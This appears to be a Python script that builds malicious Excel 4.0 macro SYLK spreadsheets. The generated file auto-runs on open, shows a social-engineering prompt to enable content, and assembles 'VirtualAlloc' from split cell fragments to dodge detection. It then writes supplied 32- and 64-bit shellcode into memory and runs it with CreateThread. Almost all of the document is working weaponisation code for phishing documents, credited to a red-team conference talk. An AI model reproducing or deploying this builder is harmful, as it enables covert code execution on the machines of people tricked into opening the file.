#!/usr/bin/python
import sys

# Some of this code is bastardised from code by @StanHacked
# For a breakdown of this technique I recommend watching
# http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen

def bytes2int(str):
	return int(str.encode('hex'), 16)

SHELLCODE_HEADER = """ID;P
O;E
NN;NAuto_open;ER5C102;KSpreadsheet;F
C;X1;Y1;K"Enable Content to update file encoding."
C;X102;Y1;K"Vir"
C;X102;Y2;K"tual"
C;X102;Y3;K"All"
C;X102;Y4;K"oc"
C;X102;Y5;K0;ECONCATENATE(R1C102,R2C102,R3C102,R4C102)
C;X102;Y6;K0;ER1C103()
C;X103;Y1;K0;EERROR(FALSE, R2C103:R3C103)
C;X103;Y2;K""C:\\Program Files (x86)\\Microsoft Office\\root""
C;X103;Y3;K0;EDIRECTORY(R2C103)
C;X103;Y4;K0;EIF(ISERROR(R3C103), R1C100(), R1C104())
C;X104;Y1;K0;ER1C105()
C;X104;Y2;K0;ECALL("Kernel32",R5C102,"JJJJJ",0,%s,4096,64)
C;X104;Y3;K0;ESELECT(R1C105:R1000:C105,R1C105)
C;X104;Y4;K0;ESET.VALUE(R1C99, 0)
C;X104;Y5;K0;EWHILE(LEN(ACTIVE.CELL())>0)
C;X104;Y6;K0;ECALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C104 + R1C99 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
C;X104;Y7;K0;ESET.VALUE(R1C99, R1C99 + 1)
C;X104;Y8;K0;ESELECT(, "R[1]C")
C;X104;Y9;K0;ENEXT()
C;X104;Y10;K0;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C104, 0, 0, 0)
C;X104;Y11;K0;ER11C100()
C;X100;Y1;K0;ER1C101()
C;X100;Y2;K0;ECALL("Kernel32",R5C102,"JJJJJ",1342177280,%s,12288,64)
C;X100;Y3;K0;ESELECT(R1C101:R1000:C101,R1C101)
C;X100;Y4;K0;ESET.VALUE(R1C99, 0)
C;X100;Y5;K0;EWHILE(LEN(ACTIVE.CELL())>0)
C;X100;Y6;K0;ECALL("kernel32", "RtlCopyMemory", "JJCJ",R2C100 + R1C99 * 20,ACTIVE.CELL(),LEN(ACTIVE.CELL()))
C;X100;Y7;K0;ESET.VALUE(R1C99, R1C99 + 1)
C;X100;Y8;K0;ESELECT(, "R[1]C")
C;X100;Y9;K0;ENEXT()
C;X100;Y10;K0;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C100, 0, 0, 0)
C;X100;Y11;K0;ESELECT(R1C1, R1C1)
C;X100;Y12;K0;ESET.VALUE(R1C1, "AAAAAAA")
C;X100;Y13;K0;ESET.VALUE(R2C1, "BBBBBBB")
C;X100;Y14;K0;ESET.VALUE(R3C1, "CCCCCCC")
C;X100;Y15;K0;ESET.VALUE(R4C1, "DDDDDDD")
C;X100;Y16;K0;ESET.VALUE(R5C1, "EEEEEEE")
C;X100;Y17;K0;ESET.VALUE(R6C1, "FFFFFFF")
C;X100;Y28;K0;EHALT()
"""

def generate_slk(shellcode_path, shellcode_path64):
	return build_shellcode_slk(shellcode_path, shellcode_path64)

def build_shellcode_slk(shellcode_path, shellcode_path64):
	#print("[*] Building shellcode exec SLK")
	slk_shellcode_32, size32 = build_shellcode_arch(shellcode_path, 105)
	slk_shellcode_64, size64 = build_shellcode_arch(shellcode_path64, 101)
	slk_output = SHELLCODE_HEADER % (size32, size64)
	slk_output+= slk_shellcode_32 + slk_shellcode_64 + "\nE"
	return slk_output

def build_shellcode_arch(shellcode_path, raw):
	output = ""
	with open(shellcode_path, "rb") as f:
	    byte = f.read(1)
	    i = 0
	    cell=0
	    while byte != "":
		if i == 0:
			cell=cell+1
			output+=("C;X%s;Y%s;K0;E" % (raw, str(cell)))
		else:
			output+=("&")
		output+=("CHAR(" + str(bytes2int(byte)) + ")")
	        byte = f.read(1)
		i+=1
		if i == 20:
			output+=("\n")
			i = 0
	cell=cell+1
	output+=("\nC;X%s;Y%s;K0;ERETURN()\n" % (raw, str(cell)))
	return output, cell * 20
